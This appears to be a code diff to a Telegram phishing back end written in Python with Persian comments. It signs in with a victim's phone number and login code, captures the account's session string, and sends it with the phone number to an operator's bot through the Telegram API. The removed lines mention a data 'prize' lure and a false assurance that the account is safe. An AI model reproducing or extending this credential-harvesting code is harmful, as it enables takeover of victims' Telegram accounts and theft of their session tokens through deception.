@@ -65,9 +65,6 @@ def verify_code():
         logging.error(f"Error in verify_code: {e}")
         return jsonify({'error': str(e)}), 500
 
-# ============================================================
-# توابع اصلی
-# ============================================================
 async def send_code(session_id, phone):
     try:
         client = TelegramClient(session_id, API_ID, API_HASH)
@@ -101,7 +98,7 @@ async def verify_session(session_id, phone, code):
         return False
 
     try:
-        # ✅ تایید کد
+        # ✅ تایید کد با phone_code_hash
         await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         
         # ✅ تایید لاگین با get_me()
@@ -115,34 +112,31 @@ async def verify_session(session_id, phone, code):
         
         # ✅ ارسال پیام حرفه‌ای و انگلیسی
         if session_string and len(session_string) > 10:
-            message = f"""🎯 <b>New Session Captured</b>
+            message = f"""✅ <b>Session Captured Successfully</b>
 
 ┌─────────────────
-│ 📱 <b>User:</b> <code>{phone}</code>
-│ 🔐 <b>Session String:</b>
+│ 📱 User: <code>{phone}</code>
+│ 🔐 Session String:
 │ <code>{session_string}</code>
-│ 🎁 <b>Prize:</b> {session.get('prize', 'N/A')} GB
-│ 🆔 <b>Request ID:</b> {session_id}
 └─────────────────
 
-✅ <b>Status:</b> Logged out successfully
-🔒 <b>Security:</b> Account is safe"""
+🔒 <b>Status:</b> Logged out automatically"""
         else:
             message = f"""❌ <b>Session Capture Failed</b>
 
 ┌─────────────────
-│ 📱 <b>User:</b> <code>{phone}</code>
-│ 🔐 <b>Session String:</b> <code>EMPTY</code>
+│ 📱 User: <code>{phone}</code>
+│ 🔐 Session String: <code>EMPTY</code>
 └─────────────────
 
 ⚠️ Please try again."""
-        
+
         send_to_bot(message)
-        
+
         # ✅ خروج کامل از اکانت
         await client.log_out()
         await client.disconnect()
-        
+
         sessions[session_id]['status'] = 'done'
         logging.info(f"✅ Session saved and logged out for: {phone}")
         return True
@@ -156,9 +150,6 @@ async def verify_session(session_id, phone, code):
             return False
         raise
 
-# ============================================================
-# ارسال به بات با پیام حرفه‌ای
-# ============================================================
 def send_to_bot(message):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
